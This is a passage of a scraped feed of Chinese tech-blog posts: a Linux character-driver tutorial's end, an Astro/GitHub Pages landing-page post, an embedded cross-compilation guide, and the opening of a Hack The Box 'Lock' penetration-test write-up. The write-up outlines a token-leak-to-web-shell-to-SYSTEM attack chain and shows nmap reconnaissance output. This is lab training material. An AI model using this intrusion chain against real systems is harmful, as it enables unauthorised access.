style=\"color: rgba(0, 0, 0, 1);\">private_data;    \n    \n    </span><span style=\"color: rgba(0, 0, 255, 1);\">switch</span><span style=\"color: rgba(0, 0, 0, 1);\">(cmd) {\n    </span><span style=\"color: rgba(0, 0, 255, 1);\">case</span><span style=\"color: rgba(0, 0, 0, 1);\"> MEM_CLEAR:\n        down(</span>&amp;dev-&gt;<span style=\"color: rgba(0, 0, 0, 1);\">sem);\n        dev</span>-&gt;current_len = <span style=\"color: rgba(128, 0, 128, 1);\">0</span><span style=\"color: rgba(0, 0, 0, 1);\">;\n        memset(dev</span>-&gt;mem, <span style=\"color: rgba(128, 0, 128, 1);\">0</span><span style=\"color: rgba(0, 0, 0, 1);\">, GLOBALFIFO_SIZE);\n        up(</span>&amp;dev-&gt;<span style=\"color: rgba(0, 0, 0, 1);\">sem);\n        </span><span style=\"color: rgba(0, 0, 255, 1);\">break</span><span style=\"color: rgba(0, 0, 0, 1);\">;\n    </span><span style=\"color: rgba(0, 0, 255, 1);\">default</span><span style=\"color: rgba(0, 0, 0, 1);\">:\n        </span><span style=\"color: rgba(0, 0, 255, 1);\">return</span> -<span style=\"color: rgba(0, 0, 0, 1);\">EINVAL;\n    }\n    </span><span style=\"color: rgba(0, 0, 255, 1);\">return</span> <span style=\"color: rgba(128, 0, 128, 1);\">0</span><span style=\"color: rgba(0, 0, 0, 1);\">;\n}\n\n\n\n</span><span style=\"color: rgba(0, 0, 255, 1);\">static</span> <span style=\"color: rgba(0, 0, 255, 1);\">const</span> <span style=\"color: rgba(0, 0, 255, 1);\">struct</span> file_operations globalfifo_fops =<span style=\"color: rgba(0, 0, 0, 1);\"> {\n    .owner </span>=<span style=\"color: rgba(0, 0, 0, 1);\"> THIS_MODULE,\n    .open </span>=<span style=\"color: rgba(0, 0, 0, 1);\"> globalfifo_open,\n    .release </span>=<span style=\"color: rgba(0, 0, 0, 1);\"> globalfifo_release,\n    .llseek </span>=<span style=\"color: rgba(0, 0, 0, 1);\"> globalfifo_llseek,\n    .read </span>=<span style=\"color: rgba(0, 0, 0, 1);\"> globalfifo_read,\n    .write </span>=<span style=\"color: rgba(0, 0, 0, 1);\"> globalfifo_write,\n    .unlocked_ioctl </span>=<span style=\"color: rgba(0, 0, 0, 1);\"> globalfifo_unlocked_ioctl\n};\n\n\n</span><span style=\"color: rgba(0, 128, 0, 1);\">/*</span><span style=\"color: rgba(0, 128, 0, 1);\"> 设备驱动模块insmod加载函数 </span><span style=\"color: rgba(0, 128, 0, 1);\">*/</span>\n<span style=\"color: rgba(0, 0, 255, 1);\">static</span> <span style=\"color: rgba(0, 0, 255, 1);\">int</span> globalfifo_init(<span style=\"color: rgba(0, 0, 255, 1);\">void</span><span style=\"color: rgba(0, 0, 0, 1);\">) {\n    </span><span style=\"color: rgba(0, 128, 0, 1);\">//</span><span style=\"color: rgba(0, 128, 0, 1);\"> 向 Linux 内核中注册字符设备编号范围</span>\n    register_chrdev_region(MKDEV(globalfifo_major, <span style=\"color: rgba(128, 0, 128, 1);\">0</span>), <span style=\"color: rgba(128, 0, 128, 1);\">1</span>, <span style=\"color: rgba(128, 0, 0, 1);\">\"</span><span style=\"color: rgba(128, 0, 0, 1);\">globalfifo</span><span style=\"color: rgba(128, 0, 0, 1);\">\"</span><span style=\"color: rgba(0, 0, 0, 1);\">);\n\n    </span><span style=\"color: rgba(0, 128, 0, 1);\">//</span><span style=\"color: rgba(0, 128, 0, 1);\"> 为设备以及共享内存分配内存</span>\n    globalfifo_devp = kmalloc(<span style=\"color: rgba(0, 0, 255, 1);\">sizeof</span>(<span style=\"color: rgba(0, 0, 255, 1);\">struct</span><span style=\"color: rgba(0, 0, 0, 1);\"> globalfifo_dev), GFP_KERNEL);\n    memset(globalfifo_devp, </span><span style=\"color: rgba(128, 0, 128, 1);\">0</span>, <span style=\"color: rgba(0, 0, 255, 1);\">sizeof</span>(<span style=\"color: rgba(0, 0, 255, 1);\">struct</span><span style=\"color: rgba(0, 0, 0, 1);\"> globalfifo_dev));\n    \n    </span><span style=\"color: rgba(0, 128, 0, 1);\">//</span><span style=\"color: rgba(0, 128, 0, 1);\"> 初始化字符设备0的基本字段</span>\n    cdev_init(&amp;globalfifo_devp-&gt;m_cdev, &amp;<span style=\"color: rgba(0, 0, 0, 1);\">globalfifo_fops);\n    globalfifo_devp</span>-&gt;m_cdev.owner =<span style=\"color: rgba(0, 0, 0, 1);\"> THIS_MODULE;\n    </span><span style=\"color: rgba(0, 128, 0, 1);\">//</span><span style=\"color: rgba(0, 128, 0, 1);\"> 将主设备号globalfifo_major次设备号0，与字符设备驱动的关联</span>\n    cdev_add(&amp;globalfifo_devp-&gt;m_cdev, MKDEV(globalfifo_major, <span style=\"color: rgba(128, 0, 128, 1);\">0</span>), <span style=\"color: rgba(128, 0, 128, 1);\">1</span><span style=\"color: rgba(0, 0, 0, 1);\">);\n\n    </span><span style=\"color: rgba(0, 128, 0, 1);\">//</span><span style=\"color: rgba(0, 128, 0, 1);\"> 初始化信号量</span>\n    sema_init(&amp;globalfifo_devp-&gt;sem, <span style=\"color: rgba(128, 0, 128, 1);\">1</span><span style=\"color: rgba(0, 0, 0, 1);\">);\n\n    </span><span style=\"color: rgba(0, 128, 0, 1);\">//</span><span style=\"color: rgba(0, 128, 0, 1);\"> 初始化读写等待队列头</span>\n    init_waitqueue_head(&amp;globalfifo_devp-&gt;<span style=\"color: rgba(0, 0, 0, 1);\">r_wait);\n    init_waitqueue_head(</span>&amp;globalfifo_devp-&gt;<span style=\"color: rgba(0, 0, 0, 1);\">w_wait);\n    </span><span style=\"color: rgba(0, 0, 255, 1);\">return</span> <span style=\"color: rgba(128, 0, 128, 1);\">0</span><span style=\"color: rgba(0, 0, 0, 1);\">;\n}\n\n\n</span><span style=\"color: rgba(0, 0, 255, 1);\">static</span> <span style=\"color: rgba(0, 0, 255, 1);\">void</span> globalfifo_exit(<span style=\"color: rgba(0, 0, 255, 1);\">void</span><span style=\"color: rgba(0, 0, 0, 1);\">) {\n    dev_t devno;\n    </span><span style=\"color: rgba(0, 128, 0, 1);\">//</span><span style=\"color: rgba(0, 128, 0, 1);\"> 注销cdev</span>\n    cdev_del(&amp;globalfifo_devp-&gt;<span style=\"color: rgba(0, 0, 0, 1);\">m_cdev);\n    </span><span style=\"color: rgba(0, 128, 0, 1);\">//</span><span style=\"color: rgba(0, 128, 0, 1);\"> 释放设备结构体内存</span>\n<span style=\"color: rgba(0, 0, 0, 1);\">    kfree(globalfifo_devp);    \n    </span><span style=\"color: rgba(0, 128, 0, 1);\">//</span><span style=\"color: rgba(0, 128, 0, 1);\"> 释放设备号</span>\n    devno = MKDEV(globalfifo_major, <span style=\"color: rgba(128, 0, 128, 1);\">0</span><span style=\"color: rgba(0, 0, 0, 1);\">);\n    unregister_chrdev_region(devno, </span><span style=\"color: rgba(128, 0, 128, 1);\">1</span><span style=\"color: rgba(0, 0, 0, 1);\">);\n}\n\n\nMODULE_AUTHOR(</span><span style=\"color: rgba(128, 0, 0, 1);\">\"</span><span style=\"color: rgba(128, 0, 0, 1);\">cear</span><span style=\"color: rgba(128, 0, 0, 1);\">\"</span><span style=\"color: rgba(0, 0, 0, 1);\">);\nMODULE_LICENSE(</span><span style=\"color: rgba(128, 0, 0, 1);\">\"</span><span style=\"color: rgba(128, 0, 0, 1);\">GPL</span><span style=\"color: rgba(128, 0, 0, 1);\">\"</span><span style=\"color: rgba(0, 0, 0, 1);\">);\n\nmodule_param(globalfifo_major, </span><span style=\"color: rgba(0, 0, 255, 1);\">int</span><span style=\"color: rgba(0, 0, 0, 1);\">, S_IRUGO);\nmodule_init(globalfifo_init);\nmodule_exit(globalfifo_exit);</span></pre>\n</div>\n<p>&nbsp;</p>\n\n</div>\n<div class=\"clear\"></div>\n\n            </div>\n            <div class=\"postDesc\">posted @ \n<span id=\"post-date\">2026-02-16 09:51</span>&nbsp;\n<a href=\"https://www.cnblogs.com/cear\">cear</a>&nbsp;\n阅读(<span id=\"post_view_count\">37</span>)&nbsp;\n评论(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">收藏</a>&nbsp;\n<a href=\"\">举报</a>\n</div>"
    },
    {
      "title": "Claude Code配合Astro + GitHub Pages：为 sharelatex-ce 打造现代化的开源项目宣传页",
      "link": "https://www.cnblogs.com/xuhe2/p/19618589",
      "published": "",
      "description": "<h1 class=\"postTitle\">\n                <a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/xuhe2/p/19618589\" id=\"cb_post_title_url\" title=\"发布于 2026-02-15 21:51\">\n    <span>Claude Code配合Astro + GitHub Pages：为 sharelatex-ce 打造现代化的开源项目宣传页</span>\n    \n\n</a>\n\n            </h1>\n            <div class=\"clear\"></div>\n            <div class=\"postBody\">\n                <div class=\"blogpost-body cnblogs-markdown\" id=\"cnblogs_post_body\">\n<h1 id=\"效果\">效果</h1>\n<p>开源项目宣传页: <a href=\"https://xuhe2.github.io/sharelatex-ce/\" rel=\"noopener nofollow\" target=\"_blank\">https://xuhe2.github.io/sharelatex-ce/</a></p>\n<blockquote>\n<p>因为自建协作环境不该比写论文本身还难，所以我做了 sharelatex-ce 来实现真正的“一键式” Overleaf 私有化部署体验。</p>\n</blockquote>\n<p>实现效果:<br />\n<img alt=\"PixPin_2026-02-15_21-33-47\" class=\"lazyload\" /></p>\n<h1 id=\"为什么需要一个好看的宣传页\">为什么需要一个好看的宣传页？</h1>\n<p>说实话，程序员眼里的“美”往往很纯粹：代码整洁、架构优雅、README 文档清晰。但现实是残酷的——如果你的开源项目只有一堆冷冰冰的代码和长篇累牍的 Markdown 说明，那它就像是一个穿着睡衣去参加晚宴的天才，即便满腹经纶，也很难在第一时间抓住别人的眼球。</p>\n<p>在这个“颜值即正义”的 GitHub 时代，宣传页（Landing Page）就是项目的脸面。 它不仅能让用户在 3 秒钟内明白你的项目是干什么的，更像是一种“专业背书”。一个精致的页面在无声地告诉访问者：“看，开发者连这种细枝末节都打磨得这么认真，代码质量肯定差不了。” <strong>毕竟，大家都很忙，比起啃文档，谁不希望能一眼看到那个闪闪发光的 Docker-compose up 按钮呢？</strong></p>\n<h1 id=\"技术选型-后端人ai-干-前端\">技术选型: 后端人+AI 干 前端</h1>\n<p>作为一名后端程序员，让我手写 CSS 布局简直是某种程度上的“酷刑”。但在 2026 年，如果你还觉得做网页得从 </p><div> 开始一行行抠代码，那可能真的错过了这个时代的红利。<p></p>\n<p>我的选型逻辑非常直接：<strong>AI擅长什么框架, 我选什么框架, 让专业的人干专业的事，让 AI 干累人的事</strong></p>\n<ul>\n<li>\n<p>Astro 框架： 为什么不选 React 或 Vue？因为我不需要一个沉重的单页应用。Astro 是为内容驱动型网站而生的，它极快、极简，生成的静态页面干净得像刚刚洗过的代码。最重要的是，它对 SEO 极其友好，且支持各种组件混合，“学术范儿”十足。</p>\n</li>\n<li>\n<p>Claude Code： 这才是本次部署的秘密武器。作为一个非前端程序员，我只需要把我的需求、项目定位、甚至是喜欢的配色方案(<strong>其实我压根没有审美, AI看着来就好了, AI味? 我会受着</strong>)丢给 Claude。它不仅帮我写出了像模像样的 UI，甚至连那些弯弯绕绕的 GitHub Actions 部署逻辑都安排得明明白白。</p>\n</li>\n<li>\n<p>AI 时代的开发范式, 现在的开发逻辑已经变了吗? 我压根不了解 Tailwind 类名，我只需要扮演好“产品经理”的角色，通过简短的提示词（Prompt）指挥 AI 进行构建(<strong>实现细节? 相信AI的审美, 反正肯定比我好</strong>)。“不是前端写不起，而是 Claude 更有性价比。”</p>\n</li>\n</ul>\n<h1 id=\"开启github-pages功能\">开启Github Pages功能</h1>\n<ol>\n<li>\n<p>进入设置：在项目仓库顶栏点击 Settings。</p>\n</li>\n<li>\n<p>定位功能：左侧侧边栏找到并点击 Pages 选项。</p>\n</li>\n<li>\n<p>配置来源：在 Build and deployment -&gt; Source 中选择 Deploy from a branch。</p>\n</li>\n<li>\n<p>选定路径：在 Branch 下拉菜单选择目标分支（如 gh-pages），路径保持 / (root)。</p>\n</li>\n<li>\n<p>生效访问：点击 Save。稍等片刻，页面顶部会出现绿色的访问 URL。</p>\n</li>\n</ol>\n<p><img alt=\"image\" class=\"lazyload\" /></p>\n<blockquote>\n<p>点击<code>Settings</code></p>\n</blockquote>\n<p><img alt=\"image\" class=\"lazyload\" /></p>\n<p><img alt=\"image\" class=\"lazyload\" /></p>\n<p><img alt=\"image\" class=\"lazyload\" /></p>\n<h1 id=\"部署的宣传页出现了资源无法加载的问题\">部署的宣传页出现了资源无法加载的问题</h1>\n<h2 id=\"原因\">原因</h2>\n<p>GitHub Pages 默认使用 Jekyll 来构建网页。在 Jekyll 的规则中，任何以下划线 _ 开头的文件夹（例如 _astro/）都会被视为内部私有文件夹，不会被发布到服务器上。</p>\n<p>由于 Astro 默认将所有的 CSS 和 JS 文件放在 _astro/ 目录下，GitHub Pages 实际上并没有把这些文件部署出去，所以你的浏览器请求时会报 404。</p>\n<h2 id=\"解决方案1\">解决方案1</h2>\n<ul>\n<li>核心解决方法：添加 .nojekyll 文件</li>\n</ul>\n<blockquote>\n<p>你需要告诉 GitHub：“不要用 Jekyll 运行我的网站，直接把我的文件原样发出去”。</p>\n</blockquote>\n<p>操作步骤：</p>\n<ol>\n<li>在你的 gh-pages 分支的根目录下，创建一个名为 .nojekyll 的空文件（注意前面有一个点）。</li>\n<li>提交并推送。</li>\n</ol>\n<h2 id=\"解决方案2\">解决方案2</h2>\n<p>修改代码, 配置静态资源所在的位置, 修改<code>astro.config.mjs</code>文件内容:</p>\n<pre><code>diff --git a/landing-page/astro.config.mjs b/landing-page/astro.config.mjs\nindex 1ae7417..b1f04c3 100644\n--- a/landing-page/astro.config.mjs\n+++ b/landing-page/astro.config.mjs\n@@ -7,5 +7,6 @@ export default defineConfig({\n   site: 'https://xuhe2.github.io/sharelatex-ce/',\n   build: {\n     format: 'directory',\n+    assets: 'assets',\n   },\n });\n</code></pre>\n<h1 id=\"参考文献\">参考文献</h1>\n<p>官方文档: <a href=\"https://docs.github.com/en/pages/getting-started-with-github-pages/what-is-github-pages\" rel=\"noopener nofollow\" target=\"_blank\">https://docs.github.com/en/pages/getting-started-with-github-pages/what-is-github-pages</a></p>\n</div>\n\n</div>\n<div class=\"clear\"></div>\n\n            </div>\n            <div class=\"postDesc\">posted @ \n<span id=\"post-date\">2026-02-15 21:51</span>&nbsp;\n<a href=\"https://www.cnblogs.com/xuhe2\">xuhe2</a>&nbsp;\n阅读(<span id=\"post_view_count\">58</span>)&nbsp;\n评论(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">收藏</a>&nbsp;\n<a href=\"\">举报</a>\n</div>"
    },
    {
      "title": "嵌入式Linux手动交叉编译开源软件需要注意的问题",
      "link": "https://www.cnblogs.com/ttkwzyttk/p/19618661",
      "published": "",
      "description": "<h1 class=\"postTitle\">\n                <a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/ttkwzyttk/p/19618661\" id=\"cb_post_title_url\" title=\"发布于 2026-02-15 20:48\">\n    <span>嵌入式Linux手动交叉编译开源软件需要注意的问题</span>\n    \n\n</a>\n\n            </h1>\n            <div class=\"clear\"></div>\n            <div class=\"postBody\">\n                    <div id=\"cnblogs_post_description\" style=\"display: none;\">\n        \n        该文章主要提到了一些常见的编译错误及其解决方案，并提供了一些最佳实践，帮助开发者避免编译过程中的陷阱。通过这些建议，读者能够更高效地进行嵌入式Linux开发，减少编译和调试的时间。\n    </div>\n<div class=\"blogpost-body cnblogs-markdown\" id=\"cnblogs_post_body\">\n<p>在嵌入式Linux的开发过程中，我们经常需要用到一些软件库或者是测试工具，这些库和工具大概率都是x86平台上开发的，就需要我们通过对源码进行交叉编译，生成能够在开发板上使用的软件和动态库。</p>\n<p>对于某些开源软件进行编译有两种情况，第一种是如果我们使用buildroot根文件系统，可以在buildroot的<code>menuconfig</code>编译菜单中，勾选相应的软件，重新编译根文件系统，编译完成之后该根文件系统就会自动带上对应的库和可执行程序，第二种是buildroot中无法找到我们需要的软件，这种情况下，只能够进行手动交叉编译，接下具体讲解下手动交叉编译开源软件可能遇到的一些问题</p>\n<h1 id=\"一使用交叉编译工具链时常见问题\">一、使用交叉编译工具链时常见问题</h1>\n<h2 id=\"11-编译过程中头文件相关问题\">1.1 编译过程中头文件相关问题</h2>\n<p>交叉编译时我们可能会遇到找不到头文件的问题，我们都知道在x86平台上开发程序，程序中通过尖括号的方式包含头文件：<code>#include &lt;xxx.h&gt;</code>他会到系统目录下去查找所需要的头文件，一般情况在<code>/usr/include</code>或者<code>/usr/local/include</code>路径下，那么对于我们的交叉编译工具的系统目录又是哪里呢，我们可以通过以下命令来查看当前交叉编译工具对应的<code>include</code>系统路径在哪</p>\n<pre><code class=\"language-c\">echo 'main(){}' | &lt;交叉编译工具&gt; -E -v -\n</code></pre>\n<p>这个命令利用 <code>gcc</code> 的预处理（<code>-E</code>）和详细输出（<code>-v</code>）功能，帮助查看编译器查找头文件和库文件的路径。适用于调试和理解交叉编译器的工作原理，尤其是在处理不同平台和工具链时。下面在我的平台中举例，我使用rk3576的SDK中自带的交叉编译工具，执行如上命令之后，输出结果如下图所示<br />\n<img alt=\"Pasted image 20260215184437.png\" src=\"https://img2024.cnblogs.com/blog/2652772/202602/2652772-20260215204541237-2069199422.png\" /><br />\n可以看见，该命令将<code>#include \"\"</code>和<code>#include &lt;&gt;</code>会查找的路径都打印了出来，对于源文件中通过<code>#include \"\"</code>的头文件，该编译器会到源文件当前路径下查找，对与原文件中通过<code>#include &lt;&gt;</code>的头文件，<code>aarch64-none-linux-gnuu-gcc</code>编译器会去以下三个路径中去查找，而不是x86平台下的系统路径中去查找。如果在我们交叉编译过程中，缺少某些头文件，我们就可以把对应头文件拷贝到这些目录中去，放到任意一个路径下就行。</p>\n<pre><code class=\"language-shell\">/home/wzy/sdk/rk3576_linux6.1.99_release-rkr5/prebuilts/gcc/linux-x86/aarch64/gcc-arm-10.3-2021.07-x86_64-aarch64-none-linux-gnu/bin/../lib/gcc/aarch64-none-linux-gnu/10.3.1/include  \n/home/wzy/sdk/rk3576_linux6.1.99_release-rkr5/prebuilts/gcc/linux-x86/aarch64/gcc-arm-10.3-2021.07-x86_64-aarch64-none-linux-gnu/bin/../lib/gcc/aarch64-none-linux-gnu/10.3.1/include-fixed  \n/home/wzy/sdk/rk3576_linux6.1.99_release-rkr5/prebuilts/gcc/linux-x86/aarch64/gcc-arm-10.3-2021.07-x86_64-aarch64-none-linux-gnu/bin/../lib/gcc/aarch64-none-linux-gnu/10.3.1/../../../../aarch64-none-linux-gnu/inclu  \nde\n</code></pre>\n<p>除了上面这种方法，也可以直接在编译源文件的时候在后面加上<code>-v</code>选项查看详细的编译信息，例如我这里编译一个usb相关的应用程序，下面是我执行交叉编译的命令，后面加上了<code>-v</code>来显示具体的编译信息</p>\n<pre><code class=\"language-shell\">/home/wzy/sdk/rk3576_linux6.1.99_release-rkr5/prebuilts/gcc/linux-x86/aarch64/gcc-arm-10.3-2021.07-x86_64-aarch64-none-linux-gnu/bin/aarch64-none-linux-gnu-gcc usb1.c -o usb1 -v\n</code></pre>\n<p>执行结果如下<br />\n<img alt=\"Pasted image 20260215203358.png\" src=\"https://img2024.cnblogs.com/blog/2652772/202602/2652772-20260215204541189-1040648713.png\" /><br />\n这里可以看见上面所讲的交叉编译工具的头文件系统路径，同时也报出一个错误，无法找到<code>libusb.h</code>文件，因为我没有吧对应头文件拷贝到红框中的任何一个头文件路径中去，也没有通过<code>-I</code>命令手动指定。接下来我将通过手动指定的方式来展示加了这个选项之后的变化。</p>\n<p>上面提到了除了使用系统目录外，也可以自己指定目录：编译时用<code>-I&lt;path&gt;</code>选项指定。编译时，编译器会优先使用通过<code>-I</code>指定的路径，因为如果指定了<code>-I</code>选项，该选项的路径会放到最前面，接着上面的报错，我加入了<code>-I</code>选项之后<br />\n<img alt=\"Pasted image 20260215203743.png\" src=\"https://img2024.cnblogs.com/blog/2652772/202602/2652772-20260215204541172-1625023185.png\" /><br />\n可以看见<code>-I</code>选项指定的路径优先级排到了最前面</p>\n<h2 id=\"12-编译过程中库文件问题\">1.2 编译过程中库文件问题</h2>\n<p>在交叉编译链接程序时如果有这样的提示：<code>undefined reference to xxx</code>，它表示 <code>xxx</code> 函数未定义。出现这个错误主要是有两种情况，第一就是交叉编译工具的系统库文件路径中没有相应的库，第二就是编译源码使用的库的版本和当前系统中库的版本不同，库的差异导致报错。解决方法要么去写出这个函数，或是使用库函数，那需要在链接时指定库。那么我们如何确定交叉编译工具对应的系统库文件在哪里？同样执行相同命令确定目录</p>\n<pre><code class=\"language-c\">echo 'main(){}' | &lt;交叉编译工具&gt; -E -v -\n</code></pre>\n<p>当然也可以在编译命令后加上<code>-v</code>选项<br />\n<img alt=\"Pasted image 20260215185448.png\" src=\"https://img2024.cnblogs.com/blog/2652772/202602/2652772-20260215204541242-413123482.png\" /><br />\n可以看到红框部分打印出了<code>LIBRARY_PATH</code>这个宏，这个宏就表示的是交叉编译工具在链接时，会到这些路径下去查找库文件，当我们缺少库文件时，可以将库文件拷贝到这些目录下的任意一个路径就行，同样我们也可以自己指定链接库的路径，链接时用<code>-L&lt;path&gt;</code>选项指定，编译时，编译器会优先使用通过<code>-L</code>指定的路径</p>\n<p>当我们已经将需要链接的库拷贝到对应的系统库文件路径下之后，或者我们已经通过<code>-L</code>选项指定了库路径之后，我们想要链接库应该如何操作？例如我们想要链接<code>libpthread.so</code>，那么我们在编译链接时就需要加上<code>-lpthread</code>的编译选项。就可以正常编译程序了。</p>\n<p>到此，我们已经知道了，编译一个开源软件时，如果出现了问题，应该如何查找交叉编译工具的头文件路径和库文件路径，主要用来处理一些开源软件编译过程中，依赖缺失的问题，例如我现在需要编译一个软件，但是缺少其他软件的库依赖，那么我们就需要先交叉编译依赖库，然后将编译出来的库以及对应头文件拷贝到交叉编译工具对应的头文件和库文件的系统目录下，再编译我们的目标软件，这里需要注意的一点就是，编译出来的<code>lib</code>文件，有一些可能是一个库软连接到了另一个库上，所以在拷贝的时候需要使用<code>cp -drf</code>命令来拷贝，避免破坏软连接</p>\n<p>那么通过<code>-I</code>和<code>-L</code>指定路径与将依赖头文件与库拷贝到已有的路径中，有什么区别？区别就是如果使用指定路径的方式，在每次编译的时候都需要重新输一遍路径，这对于只用编译一次的情景还行，如果是之后的应用开发会经常用到这个库，还是建议将库拷贝到交叉编译器默认的系统库和头文件路径中去，避免每次编译的时候都重新敲一遍路径。</p>\n<h2 id=\"13-运行过程中找不到库相关问题\">1.3 运行过程中找不到库相关问题</h2>\n<p>如果在执行可执行程序的时候，出现找不到某各库的问题，说明当前的系统库路径下缺少这个库，只需要将运行需要的库，拷贝到对应的链接库目录下就能解决这个问题</p>\n<pre><code class=\"language-shell\">error while loading shared libraries: libxxx.so:\ncannot open shared object file: No such file or directory\n</code></pre>\n<p>对应的系统库路径在哪？一般系统目录就是板子上的<code>/lib</code>、<code>/usr/lib</code>目录，当前也可以自己指定，运行程序用环境变量 <code>LD_LIBRARY_PATH</code> 指定，执行以下的命令来添加一个新的库路径</p>\n<pre><code class=\"language-shell\">export LD_LIBRARY_PATH=/xxx_dir\n</code></pre>\n<p>程序运行时，并不需要头文件，如果不在开发板上编译，那么头文件不用拷贝到开发板上</p>\n\n\n</div>\n<div class=\"clear\"></div>\n\n            </div>\n            <div class=\"postDesc\">posted @ \n<span id=\"post-date\">2026-02-15 20:48</span>&nbsp;\n<a href=\"https://www.cnblogs.com/ttkwzyttk\">ttkwzyttk</a>&nbsp;\n阅读(<span id=\"post_view_count\">53</span>)&nbsp;\n评论(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">收藏</a>&nbsp;\n<a href=\"\">举报</a>\n</div>"
    },
    {
      "title": "【渗透测试】HTB靶场之Lock 全过程wp",
      "link": "https://www.cnblogs.com/DSchenzi/p/19618342",
      "published": "",
      "description": "<h1 class=\"postTitle\">\n                <a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/DSchenzi/p/19618342\" id=\"cb_post_title_url\" title=\"发布于 2026-02-15 17:05\">\n    <span>【渗透测试】HTB靶场之Lock 全过程wp</span>\n    \n\n</a>\n\n            </h1>\n            <div class=\"clear\"></div>\n            <div class=\"postBody\">\n                <div class=\"blogpost-body cnblogs-markdown\" id=\"cnblogs_post_body\">\n<h1 id=\"lock\">Lock</h1>\n<p><strong>Lock</strong> 是一台简单难度的 Windows 靶机。解题流程包括：枚举 Gitea 仓库找到个人访问令牌（PAT）；利用该令牌在服务器上部署 ASPX 网页后门，从而获得初始立足点；从 mRemoteNG 配置文件中解密出密码，得到新用户账户的登录权限；最后利用 PDF24 程序中的本地提权漏洞，获取 SYSTEM 权限的 Shell。</p>\n<h2 id=\"信息收集\">信息收集</h2>\n<p>目标ip:10.129.234.64</p>\n<p>kali ip:10.10.16.4</p>\n<pre><code class=\"language-kotlin\">┌──(root㉿kali)-[~/桌面/HTB]\n└─# nmap -A -T4 10.129.234.64          \nStarting Nmap 7.95 ( https://nmap.org ) at 2026-02-15 01:34 EST\nNmap scan report for 10.129.234.64\nHost is up (0.30s latency).\nNot shown: 996 filtered tcp ports (no-response)\nPORT     STATE SERVICE       VERSION\n80/tcp   open  http          Microsoft IIS httpd 10.0\n|_http-server-header: Microsoft-IIS/10.0\n|_http-title: Lock - Index\n| http-methods: \n|_  Potentially risky methods: TRACE\n445/tcp  open  microsoft-ds?\n3000/tcp open  http          Golang net/http server\n|_http-title: Gitea: Git with a cup of tea\n| fingerprint-strings: \n|   GenericLines, Help, RTSPRequest: \n|     HTTP/1.1 400 Bad Request\n|     Content-Type: text/plain; charset=utf-8\n|     Connection: close\n|     Request\n|   GetRequest: \n|     HTTP/1.0 200 OK\n|     Cache-Control: max-age=0, private, must-revalidate, no-transform\n|     Content-Type: text/html; charset=utf-8\n|     Set-Cookie: i_like_gitea=74301fab8c80b509; Path=/; HttpOnly; SameSite=Lax\n|     Set-Cookie: _csrf=7YhSALV0ZBSIvHetLhey94Wp5Es6MTc3MTEzNzQyMDEwNTU1NjcwMA; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax\n|     X-Frame-Options: SAMEORIGIN\n|     Date: Sun, 15 Feb 2026 06:37:00 GMT\n|     &lt;!DOCTYPE html&gt;\n|     &lt;html lang=\"en-US\" class=\"theme-auto\"&gt;\n|     &lt;head&gt;\n|     &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1\"&gt;\n|     &lt;title&gt;Gitea: Git with a cup of tea&lt;/title&gt;\n|     &lt;link rel=\"manifest\" href=\"data:application/json;base64,eyJuYW1lIjoiR2l0ZWE6IEdpdCB3aXRoIGEgY3VwIG9mIHRlYSIsInNob3J0X25hbWUiOiJHaXRlYTogR2l0IHdpdGggYSBjdXAgb2YgdGVhIiwic3RhcnRfdXJsIjoiaHR0cDovL2xvY2FsaG9zdDozMDAwLyIsImljb25zIjpbeyJzcmMiOiJodHRwOi8vbG9jYWxob3N0OjMwMDAvYXNzZXRzL2ltZy9sb2dvLnBuZyIsInR5cGUiOiJpbWFnZS9wbmciLCJzaXplcyI6IjU\n|   HTTPOptions: \n|     HTTP/1.0 405 Method Not Allowed\n|     Allow: HEAD\n|     Allow: GET\n|     Cache-Control: max-age=0, private, must-revalidate, no-transform\n|     Set-Cookie: i_like_gitea=c9a200de20c43a71; Path=/; HttpOnly; SameSite=Lax\n|     Set-Cookie: _csrf=_WL4mnt6F0jUe2zby5-7FVfiMSY6MTc3MTEzNzQyMTM0NTI4NDgwMA; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax\n|     X-Frame-Options: SAMEORIGIN\n|     Date: Sun, 15 Feb 2026 06:37:01 GMT\n|_    Content-Length: 0\n3389/tcp open  ms-wbt-server Microsoft Terminal Services\n|_ssl-date: 2026-02-15T06:38:16+00:00; +1m58s from scanner time.\n| ssl-cert: Subject: commonName=Lock\n| Not valid before: 2026-02-14T06:34:21\n|_Not valid after:  2026-08-16T06:34:21\n| rdp-ntlm-info: \n|   Target_Name: LOCK\n|   NetBIOS_Domain_Name: LOCK\n|   NetBIOS_Computer_Name: LOCK\n|   DNS_Domain_Name: Lock\n|   DNS_Computer_Name: Lock\n|   Product_Version: 10.0.20348\n|_  System_Time: 2026-02-15T06:37:37+00:00\n1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :\nSF-Port3000-TCP:V=7.95%I=7%D=2/15%Time=69916916%P=x86_64-pc-linux-gnu%r(Ge\nSF:nericLines,67,\"HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nContent-Type:\\x20t\nSF:ext/plain;\\x20charset=utf-8\\r\\nConnection:\\x20close\\r\\n\\r\\n400\\x20Bad\\x\nSF:20Request\")%r(GetRequest,3000,\"HTTP/1\\.0\\x20200\\x20OK\\r\\nCache-Control:\nSF:\\x20max-age=0,\\x20private,\\x20must-revalidate,\\x20no-transform\\r\\nConte\nSF:nt-Type:\\x20text/html;\\x20charset=utf-8\\r\\nSet-Cookie:\\x20i_like_gitea=\nSF:74301fab8c80b509;\\x20Path=/;\\x20HttpOnly;\\x20SameSite=Lax\\r\\nSet-Cookie\nSF::\\x20_csrf=7YhSALV0ZBSIvHetLhey94Wp5Es6MTc3MTEzNzQyMDEwNTU1NjcwMA;\\x20P\nSF:ath=/;\\x20Max-Age=86400;\\x20HttpOnly;\\x20SameSite=Lax\\r\\nX-Frame-Option\nSF:s:\\x20SAMEORIGIN\\r\\nDate:\\x20Sun,\\x2015\\x20Feb\\x202026\\x2006:37:00\\x20G\nSF:MT\\r\\n\\r\\n&lt;!DOCTYPE\\x20html&gt;\\n